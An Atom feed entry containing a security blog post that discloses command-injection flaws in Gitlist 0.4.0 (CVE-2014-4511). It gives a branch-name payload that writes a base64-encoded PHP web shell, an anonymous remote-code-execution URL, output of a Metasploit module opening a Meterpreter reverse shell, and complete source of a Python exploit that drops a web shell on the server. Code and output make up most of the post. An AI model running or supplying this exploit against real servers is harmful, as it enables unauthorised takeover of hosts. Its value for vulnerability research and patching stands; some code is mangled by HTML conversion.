<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">

  <title><![CDATA[Category: gitlist | ]]></title>
  <link href="http://hatRiot.github.io/blog/categories/gitlist/atom.xml" rel="self"/>
  <link href="http://hatRiot.github.io/"/>
  <updated>2018-05-24T23:45:52-07:00</updated>
  <id>http://hatRiot.github.io/</id>
  <author>
    <name><![CDATA[Bryan Alexander]]></name>
    
  </author>
  <generator uri="http://octopress.org/">Octopress</generator>

  
  <entry>
    <title type="html"><![CDATA[gitlist - commit to rce]]></title>
    <link href="http://hatRiot.github.io/blog/2014/06/29/gitlist-rce/"/>
    <updated>2014-06-29T15:00:00-07:00</updated>
    <id>http://hatRiot.github.io/blog/2014/06/29/gitlist-rce</id>
    <content type="html"><![CDATA[<p><a href="http://gitlist.org/">Gitlist</a> is a fantastic repository viewer for Git; it&rsquo;s essentially your own private Github without all the social networking and glitzy features of it.  I&rsquo;ve got a private Gitlist that I run locally, as well as a professional instance for hosting internal projects.  Last year I noticed a bug listed on their Github page that looked a lot like an exploitable <a href="https://github.com/klaussilveira/gitlist/issues/395">hole</a>:</p>

<p><code>
Oops! sh: 1: Syntax error: EOF in backquote substitution
</code></p>

<p>I commented on its exploitability at the time, and though the hole appears to be closed, the issue still remains.  I returned to this during an install of Gitlist and decided to see if there were any other bugs in the application and, as it turns out, there are a few.  I discovered a handful of bugs during my short hunt that I&rsquo;ll document here, including one anonymous remote code execution vulnerability that&rsquo;s quite trivial to pop.  These bugs were reported to the developers and CVE-2014-4511 was assigned.  These issues were fixed in version 0.5.0.</p>

<p>The first bug is actually more of a vulnerability in a library Gitlist uses, Gitter (same developers).  Gitter allows developers to interact with Git repositories using Object-Oriented Programming (OOP).  During a quick once-over of the code, I noticed the library shelled out quite a few times, and one in particular stood out to me:</p>

<p><code>
$hash = $this-&gt;getClient()-&gt;run($this, "log --pretty=\"%T\" --max-count=1 $branch");</code>
```</p>

<p>This can be found in <code>Repository.php</code> of the Gitter library, and is invoked from <code>TreeController.php</code> in Gitlist.  As you can imagine, there is no sanitization on the <code>$branch</code> variable.  This essentially means that anyone with commit access to the repository can create a malicious branch name (locally or remotely) and end up executing arbitrary commands on the server.</p>

<p>The tricky part comes with the branch name; git actually has a couple restrictions on what can and cannot be part of a branch name.  This is all defined and checked inside of <a href="https://github.com/git/git/blob/cb682f8cfe63ecd0da08a526f404d295e51e3ab1/refs.c">refs.c</a>, and the rules are simply defined as (starting at line 33):</p>

<ol>
<li>Cannot begin with .</li>
<li>Cannot have a double dot (..)</li>
<li>Cannot contain ASCII control characters (?, [, ], ~, ^, :, \)</li>
<li>End with /</li>
<li>End with .lock</li>
<li>Contain a backslash</li>
<li>Cannot contain a space</li>
</ol>


<p>With these restrictions in mind, we can begin crafting our payload.</p>

<p>My first thought was, because Gitlist is written in PHP, to drop a web shell.  To do so we must print our payload out to a file in a location accessible to the web root.  As it so happens, we have just the spot to do it.  According to INSTALL.md, the following is required:</p>

<p><code>
cd /var/www/gitlist
mkdir cache
chmod 777 cache
</code></p>

<p>This is perfect; we have a <em>reliable</em> location with 777 permissions and it&rsquo;s accessible from the web root (/gitlist/cache/my_shell.php).  Second step is to come up with a payload that adheres to the Git branch rules while still giving us a shell.  What I came up with is as follows:</p>

<p>```</p>

<h1>git checkout -b &ldquo;|echo\$IFS\"PD9zeXN0ZW0oJF9SRVFVRVNUWyd4J10pOz8+Cg==\&rdquo;|base64\$IFS-d>/var/www/gitlist/cache/x"</h1>

<p>```</p>

<p>In order to inject PHP, we need the &lt;? and ?> headers, so we need to encode our PHP payload.  We use the $IFS environment variable (Internal Field Separator) to plug in our spaces and echo the base64&rsquo;d shell into <code>base64</code> for decoding, then pipe that into our payload location.</p>

<p>And it works flawlessly.</p>

<p>Though you might say, &ldquo;Hey if you have commit access it&rsquo;s game over&rdquo;, but I&rsquo;ve seen several instances of this not being the case.  Commit access does not necessarily equate to shell access.</p>

<p>The second vulnerability I discovered was a trivial RCE, exploitable by anonymous users without any access.  I first noticed the bug while browsing the source code, and ran into this:</p>

<p><code>
$blames = $repository-&gt;getBlame("$branch -- \"$file\"");
</code></p>

<p>Knowing how often they shell out, and the complete lack of input sanitization, I attempted to pop this by trivially evading the double quotes and injecting grave accents:</p>

<p><code>
http://localhost/gitlist/my_repo.git/blame/master/""`whoami`
</code></p>

<p>And what do you know?</p>

<p><img src="/images/posts/2014/gitlist_rce1.jpg"></p>

<p>Curiousity quickly overcame me, and I attempted another vector:</p>

<p><img src="/images/posts/2014/gitlist_rce2.jpg"></p>

<p>Faster my fingers flew:</p>

<p><img src="/images/posts/2014/gitlist_rce3.jpg"></p>

<p>It&rsquo;s terrifyingly clear that <em>everything</em> is an RCE.  I developed a rough PoC to drop a web shell on the system.  A test run of this is below:</p>

<p><code>
root@droot:~/exploits# python gitlist_rce.py http://192.168.1.67/gitlist/graymatter
[!] Using cache location /var/www/gitlist/cache
[!] Shell dropped; go hit http://192.168.1.67/gitlist/cache/x.php?cmd=ls
root@droot:~/exploits# curl http://192.168.1.67/gitlist/cache/x.php?cmd=id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
root@droot:~/exploits#
</code></p>

<p>I&rsquo;ve also developed a Metasploit module for this issue, which I&rsquo;ll be submitting a PR for soon.  A run of it:</p>

<p>```
msf exploit(gitlist_rce) > rexploit
[*] Reloading module&hellip;</p>

<p>[<em>] Started reverse handler on 192.168.1.6:4444
[</em>] Injecting payload&hellip;
[<em>] Executing payload..
[</em>] Sending stage (39848 bytes) to 192.168.1.67
[*] Meterpreter session 9 opened (192.168.1.6:4444 &ndash;> 192.168.1.67:34241) at 2014-06-21 23:07:01 -0600</p>

<p>meterpreter > sysinfo
Computer    : bryan-VirtualBox
OS          : Linux bryan-VirtualBox 3.2.0-63-generic #95-Ubuntu SMP Thu May 15 23:06:36 UTC 2014 i686
Meterpreter : php/php
meterpreter >
```</p>

<p>Source for the standalone Python exploit can be found below.</p>

<p>```
from commands import getoutput
import urllib
import sys</p>

<p>&ldquo;&rdquo;&ldquo;
Exploit Title: Gitlist &lt;= 0.4.0 anonymous RCE
Date: 06/20/2014
Author: drone (@dronesec)
Vendor Homepage: <a href="http://gitlist.org/">http://gitlist.org/</a>
Software link: <a href="https://s3.amazonaws.com/gitlist/gitlist-0.4.0.tar.gz">https://s3.amazonaws.com/gitlist/gitlist-0.4.0.tar.gz</a>
Version: &lt;= 0.4.0
Tested on: Debian 7
More information:
cve: CVE-2014-4511
&rdquo;&ldquo;&rdquo;</p>

<p>if len(sys.argv) &lt;= 1:</p>

<pre><code>print '%s: [url to git repo] {cache path}' % sys.argv[0]
print '  Example: python %s http://localhost/gitlist/my_repo.git' % sys.argv[0]
print '  Example: python %s http://localhost/gitlist/my_repo.git /var/www/git/cache' % sys.argv[0]
sys.exit(1)
</code></pre>

<p>url = sys.argv[1]
url = url if url[-1] != &lsquo;/&rsquo; else url[:-1]</p>

<p>path = &ldquo;/var/www/gitlist/cache&rdquo;
if len(sys.argv) > 2:</p>

<pre><code>path = sys.argv[2]
</code></pre>

<p>print &lsquo;[!] Using cache location %s&rsquo; % path</p>

<h1>payload &lt;?system($_GET[&lsquo;cmd&rsquo;]);?></h1>

<p>payload = &ldquo;PD9zeXN0ZW0oJF9HRVRbJ2NtZCddKTs/Pgo=&rdquo;</p>

<h1>sploit; python requests does not like this URL, hence wget is used</h1>

<p>mpath = &lsquo;/blame/master/&ldquo;&rdquo;<code>echo {0}|base64 -d &gt; {1}/x.php</code>&rsquo;.format(payload, path)
mpath = url+ urllib.quote(mpath)</p>

<p>out = getoutput(&ldquo;wget %s&rdquo; % mpath)
if &lsquo;500&rsquo; in out:</p>

<pre><code>print '[!] Shell dropped; go hit %s/cache/x.php?cmd=ls' % url.rsplit('/', 1)[0]
</code></pre>

<p>else:</p>

<pre><code>print '[-] Failed to drop'
print out
</code></pre>

<p>```</p>
]]></content>
  </entry>
  
</feed>
